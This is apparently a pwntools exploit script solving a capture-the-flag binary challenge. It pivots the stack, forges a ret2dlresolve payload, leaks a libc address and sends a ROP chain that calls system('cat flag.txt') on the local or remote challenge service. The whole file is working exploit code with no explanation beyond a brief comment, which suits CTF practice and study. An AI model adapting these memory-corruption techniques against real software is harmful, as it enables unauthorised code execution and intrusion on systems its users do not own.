#!/usr/bin/env python3

from pwn import *

context.terminal = "kitty @launch --location=split --cwd=current".split()


def start(argv=[], *a, **kw):
    if args.LOCAL:
        argv = argv if argv else [exe.path]
        if args.GDB:
            return gdb.debug(argv, gdbscript=gdbscript, *a, **kw)
        return process(argv, *a, **kw)
    return remote(args.HOST or host, args.PORT or port, *a, **kw)


def safe_flat(*args, unsafe_chars=b"\n", **kwargs):
    p = flat(args, **kwargs)
    if any(c in unsafe_chars for c in p):
        raise ValueError("unsafe:", p)
    return p


gdbscript = """
b main
c
"""
host, port = args.HOST or "localhost", args.PORT or 1337
exe = context.binary = ELF(args.EXE or "../src/chall", False)
libc = ELF("./libc.so.6", False)

io = start()

write_rbp = exe.sym["main"] + 23
write_rbp_with_rdx = exe.sym["main"] + 16
pop_rbp = 0x40110D
leave_ret = 0x401153

dlresolve = Ret2dlresolvePayload(exe, symbol="write", args=["cat flag.txt"])
log.info(f"{hex(dlresolve.data_addr) = }")
plt_init = exe.get_section_by_name(".plt").header.sh_addr


io.send(safe_flat(0, exe.bss(0xF50 + 8), write_rbp))
pause()
io.send(safe_flat(0x1000, exe.bss(0xF50 + 8), write_rbp_with_rdx))
pause()
io.send(safe_flat(0, 0, pop_rbp, exe.sym["got.read"] + 8, write_rbp))
pause()
# This 0xD00 is important because _rtld_global_ro._dl_x86_cpu_features.xsave_state_size
# depends on the CPU capabilities.
# See the _dl_runtime_resolve_xsavec function for more details.
n = 0xD00
io.send(
    safe_flat(
        {
            0: [exe.sym["read"] + 6, exe.sym["got.read"] + n - 8, leave_ret],
            n: [
                exe.sym["read"],
                plt_init,
                dlresolve.reloc_index,
                pop_rbp,
                exe.bss(0x900),
                write_rbp,
            ],
            dlresolve.data_addr - exe.sym["got.read"]: dlresolve.payload,
        },
        filler=b"\0",
    )
)
pause()
io.send(p8(libc.sym["read"] & 0xFF))
libc.address = u64(io.recv(0x1000)[:8]) - libc.sym["read"]
log.info(f"{hex(libc.address) = }")

rop = ROP(libc)
rop.system(dlresolve.real_args[0])
rop.exit(0)

io.sendline(safe_flat(0, 0, rop.chain()))

io.interactive()

